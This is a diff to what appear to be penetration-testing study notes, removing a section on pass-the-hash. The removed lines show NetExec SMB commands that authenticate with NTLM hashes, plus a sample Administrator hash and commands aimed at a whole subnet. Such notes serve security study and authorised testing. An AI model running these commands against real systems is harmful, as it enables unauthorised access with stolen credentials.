@@ -329,66 +329,6 @@ nxc smb $target -u <user> -p '<password>' --local-auth
 
 <!-- }}} -->
 
-<!-- Pass-The-Hash {{{-->
-### Pass-The-Hash
-
-[Pass the Hash](https://en.wikipedia.org/wiki/Pass_the_hash)
-may allow to authenticate to remote server or service
-with [[NTLM]] or [[LanMan]] hash
-
-> [!tip]
->
-> Capture hashes using [[Exploitation#Forced Authentcation|Forced Authentcation]]
-
-```sh
-nxc smb $target -u <user> -H 'LM:NT'
-```
-
-```sh
-nxc smb $target -u <user> -H 'LM:NT' --local-auth
-```
-
-```sh
-nxc smb $target -u <user> -H 'NTHASH'
-```
-
-```sh
-nxc smb $target -u <user> -H 'NTHASH' --local-auth
-```
-
-```sh
-nxc smb $target -u <user> -H '<hash>'
-```
-
-```sh
-nxc smb $target -u <user> -H '<hash>' --local-auth
-```
-
-<!-- Example {{{-->
-> [!example]-
->
-> Obtained credentials
->
-> ```sh
-> Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
-> ```
->
-> ```sh
-> nxc smb 192.168.1.0/24 -u UserNAme -H 'LM:NT'
-> ```
-> ```sh
-> nxc smb 192.168.1.0/24 -u UserNAme -H 'NTHASH'
-> ```
-> ```sh
-> nxc smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
-> ```
-> ```sh
-> nxc smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'
-> ```
-<!-- }}} -->
-
-<!-- }}} -->
-
 ___
 <!-- }}} -->
 
